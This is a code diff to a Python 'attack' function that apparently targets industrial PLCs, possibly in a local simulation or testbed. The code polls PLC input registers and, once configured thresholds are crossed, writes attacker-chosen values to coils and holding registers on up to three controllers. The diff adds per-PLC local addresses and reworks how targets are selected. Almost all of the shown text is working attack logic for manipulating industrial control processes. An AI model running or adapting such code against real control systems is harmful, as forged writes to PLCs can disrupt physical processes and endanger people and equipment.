@@ -10,6 +10,7 @@ def attack(ctx):
         config = configparser.ConfigParser()
         config.read('config.ini')
         plc = "plc1"
+        address = "0.0.0.0:5023"
         
         pckt_number = config.get('params', 'packets_number')
         pckt_value = int(config.get('params', 'packets_value'))
@@ -31,21 +32,21 @@ def attack(ctx):
                         
                     elif(case == 1): # Only sup limit
                         if(value >= int(config.get('params', 'coil1_sup_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             value +=1
                         
                     elif(case == 2): # Only inf limit
                         if(value <= int(config.get('params', 'coil1_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             value -=1
                                                             
                     elif(case == 3): # Both limits
                         if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             if(value > int(config.get('params', 'coil1_sup_limit'))):
@@ -55,7 +56,7 @@ def attack(ctx):
                       
                 else:
                     # Trigger unchecked - only main conditions
-                    trigger_operation_plc(pckt_value, plc)
+                    trigger_operation_plc(pckt_value, plc, address)
 
         else:
             # Pckt number != loop
@@ -77,21 +78,21 @@ def attack(ctx):
                         
                     elif(case == 1): # Only sup limit
                         if(value >= int(config.get('params', 'coil1_sup_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             value +=1
                         
                     elif(case == 2): # Only inf limit
                         if(value <= int(config.get('params', 'coil1_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             value -=1
                                                             
                     elif(case == 3): # Both limits
                         if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             if(value > int(config.get('params', 'coil1_sup_limit'))):
@@ -100,7 +101,7 @@ def attack(ctx):
                                 value +=1 
                 else:
                     # Trigger unchecked - only main conditions
-                    trigger_operation_plc(pckt_value, plc)
+                    trigger_operation_plc(pckt_value, plc, address)
                 ct = ct + 1
                 
     def on_level_change_plc2(value:int):
@@ -109,6 +110,7 @@ def attack(ctx):
         config = configparser.ConfigParser()
         config.read('config.ini')
         plc = "plc2"
+        address = "0.0.0.0:5022"
         
         pckt_number = config.get('params', 'packets_number')
         pckt_value = int(config.get('params', 'packets_value'))
@@ -130,21 +132,21 @@ def attack(ctx):
                         
                     elif(case == 1): # Only sup limit
                         if(value >= int(config.get('params', 'coil2_sup_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             value +=1
                         
                     elif(case == 2): # Only inf limit
                         if(value <= int(config.get('params', 'coil2_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             value -=1
                                                             
                     elif(case == 3): # Both limits
                         if(value < int(config.get('params', 'coil2_sup_limit')) and value > int(config.get('params', 'coil2_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             if(value > int(config.get('params', 'coil2_sup_limit'))):
@@ -154,7 +156,7 @@ def attack(ctx):
                     
                 else:
                     # Trigger unchecked - only main conditions
-                    trigger_operation_plc(pckt_value, plc)
+                    trigger_operation_plc(pckt_value, plc, address)
 
         else:
             # Pckt number != loop
@@ -176,21 +178,21 @@ def attack(ctx):
                         
                     elif(case == 1): # Only sup limit
                         if(value >= int(config.get('params', 'coil2_sup_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             value +=1
                         
                     elif(case == 2): # Only inf limit
                         if(value <= int(config.get('params', 'coil2_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             value -=1
                                                             
                     elif(case == 3): # Both limits
                         if(value < int(config.get('params', 'coil2_sup_limit')) and value > int(config.get('params', 'coil2_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc)
+                            trigger_operation_plc(pckt_value, plc, address)
                         else:
                             print("Waiting for triggers...")
                             if(value > int(config.get('params', 'coil2_sup_limit'))):
@@ -200,7 +202,7 @@ def attack(ctx):
                     
                 else:
                     # Trigger unchecked - only main conditions
-                    trigger_operation_plc(pckt_value, plc)
+                    trigger_operation_plc(pckt_value, plc, address)
                 ct = ct + 1
                 
                 
@@ -210,6 +212,8 @@ def attack(ctx):
             config = configparser.ConfigParser()
             config.read('config.ini')
             plc = "plc3"
+            address = "0.0.0.0:5021"
+            
             
             pckt_number = config.get('params', 'packets_number')
             pckt_value = int(config.get('params', 'packets_value'))
@@ -231,21 +235,21 @@ def attack(ctx):
                             
                         elif(case == 1): # Only sup limit
                             if(value >= int(config.get('params', 'coil3_sup_limit'))):
-                                trigger_operation_plc(pckt_value, plc)
+                                trigger_operation_plc(pckt_value, plc, address)
                             else:
                                 print("Waiting for triggers...")
                                 value +=1
                             
                         elif(case == 2): # Only inf limit
                             if(value <= int(config.get('params', 'coil3_inf_limit'))):
-                                trigger_operation_plc(pckt_value, plc)
+                                trigger_operation_plc(pckt_value, plc, address)
                             else:
                                 print("Waiting for triggers...")
                                 value -=1
                                                                 
                         elif(case == 3): # Both limits
                             if(value < int(config.get('params', 'coil3_sup_limit')) and value > int(config.get('params', 'coil3_inf_limit'))):
-                                trigger_operation_plc(pckt_value, plc)
+                                trigger_operation_plc(pckt_value, plc, address)
                             else:
                                 print("Waiting for triggers...")
                                 if(value > int(config.get('params', 'coil3_sup_limit'))):
@@ -255,7 +259,7 @@ def attack(ctx):
                         
                     else:
                         # Trigger unchecked - only main conditions
-                        trigger_operation_plc(pckt_value, plc)
+                        trigger_operation_plc(pckt_value, plc, address)
 
             else:
                 # Pckt number != loop
@@ -277,21 +281,21 @@ def attack(ctx):
                             
                         elif(case == 1): # Only sup limit
                             if(value >= int(config.get('params', 'coil3_sup_limit'))):
-                                trigger_operation_plc(pckt_value, plc)
+                                trigger_operation_plc(pckt_value, plc, address)
                             else:
                                 print("Waiting for triggers...")
                                 value +=1
                             
                         elif(case == 2): # Only inf limit
                             if(value <= int(config.get('params', 'coil3_inf_limit'))):
-                                trigger_operation_plc(pckt_value, plc)
+                                trigger_operation_plc(pckt_value, plc, address)
                             else:
                                 print("Waiting for triggers...")
                                 value -=1
                                                                 
                         elif(case == 3): # Both limits
                             if(value < int(config.get('params', 'coil3_sup_limit')) and value > int(config.get('params', 'coil3_inf_limit'))):
-                                trigger_operation_plc(pckt_value, plc)
+                                trigger_operation_plc(pckt_value, plc, address)
                             else:
                                 print("Waiting for triggers...")
                                 if(value > int(config.get('params', 'coil3_sup_limit'))):
@@ -301,7 +305,7 @@ def attack(ctx):
                         
                     else:
                         # Trigger unchecked - only main conditions
-                        trigger_operation_plc(pckt_value, plc)
+                        trigger_operation_plc(pckt_value, plc, address)
                     ct = ct + 1
     
 
@@ -326,28 +330,27 @@ def attack(ctx):
     
     
     
-    def trigger_operation_plc(p_val, plc):
+    def trigger_operation_plc(p_val, plc, address):
         
         config = configparser.ConfigParser()
         config.read('config.ini')
         
-        print(f"{plc}")
         plc_choice = ""
-        if(plc == "plc1"):
+        if(address == config.get('plc', 'plc1')):
             plc_choice = config.get('params', 'plc1_choice')
-        elif(plc == "plc2"):
+            sett = "plc1"
+        elif(address == config.get('plc', 'plc2')):
             plc_choice = config.get('params', 'plc2_choice')
-        elif(plc == "plc3"):
+            sett = "plc2"
+        elif(address == config.get('plc', 'plc3')):
             plc_choice = config.get('params', 'plc3_choice')
-        
+            sett = "plc3"
+            
             
         coil = []
         reg = []
         reg_d = []
-        
-        print(plc_choice)
-        
-        
+                
         # Extracting choices coils/registers
         choices_list = [choice.strip() for choice in plc_choice.split(',')]
         
@@ -355,13 +358,13 @@ def attack(ctx):
         
         for choice in choices_list:
             if choice.startswith('c'):
-                temp = ctx.register(plc, 'C', int(choice[-1]))
+                temp = ctx.register(sett, 'C', int(choice[-1]))
                 temp.write(p_val)
             elif choice.startswith('r'):
-                temp = ctx.register(plc, 'H', int(choice[-1]))
+                temp = ctx.register(sett, 'H', int(choice[-1]))
                 temp.write(p_val)
             elif choice.startswith('m'):
-                temp = ctx.register(plc, 'D', int(choice[-1]))
+                temp = ctx.register(sett, 'D', int(choice[-1]))
                 temp.write(p_val)
                 
             print(f"Writing on %QX0.{int(choice[-1])} - {plc}")
@@ -378,25 +381,37 @@ def attack(ctx):
     config = configparser.ConfigParser()
     config.read('config.ini')
 
-    # Allocate all IW registers
-    plc_1_input_register = ctx.register('plc1', 'I', 0)
-    plc_2_input_register = ctx.register('plc2', 'I', 0)
-    plc_3_input_register = ctx.register('plc3', 'I', 0)
+    plc_values = {}
 
-       
+    for plc_key in config['plc']:
+        plc_values[plc_key] = config.get('plc', plc_key)
+    
+    #print(plc_values)  
+
+    # Allocate all IW registers
+    if(len(plc_values)== 1):
+        plc_1_input_register = ctx.register('plc1', 'I', 0)
+    elif(len(plc_values)== 2):
+        plc_1_input_register = ctx.register('plc1', 'I', 0)
+        plc_2_input_register = ctx.register('plc2', 'I', 0)
+    else:
+        plc_1_input_register = ctx.register('plc1', 'I', 0)
+        plc_2_input_register = ctx.register('plc2', 'I', 0)
+        plc_3_input_register = ctx.register('plc3', 'I', 0)
+
+    print("done")
     # PLC attack
     # ONE PLC selected
-    if config.get('params', 'plc1_choice') != "" or config.get('params', 'plc2_choice')!= "" or config.get('params', 'plc3_choice') != "":
+    if config.get('params', 'plc1_choice') != "" or config.get('params', 'plc2_choice') != "" or config.get('params', 'plc3_choice') != "":
         print("Attacking one plc...")
-        if config.get('params', 'plc1_choice') != "":
-            print("Attacking plc one...")
+
+        if(config.get('plc', 'plc1') == "0.0.0.0:5023"):
             plc_1_input_register.start_polling(500, on_level_change_plc1)
-        elif config.get('params', 'plc2_choice') != "":
-            print("Attacking plc two...")
-            plc_2_input_register.start_polling(500, on_level_change_plc2)
-        elif config.get('params', 'plc3_choice') != "":
-            print("Attacking plc three...")
-            plc_3_input_register.start_polling(500, on_level_change_plc3)
+        elif(config.get('plc', 'plc1') == "0.0.0.0:5022"):
+            plc_1_input_register.start_polling(500, on_level_change_plc2)
+        elif(config.get('plc', 'plc1') == "0.0.0.0:5021"):
+            plc_1_input_register.start_polling(500, on_level_change_plc3)
+        
 
 
 
@@ -408,5 +423,5 @@ def attack(ctx):
     if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
         print("Attacking three plcs...")
 
-
+    
 
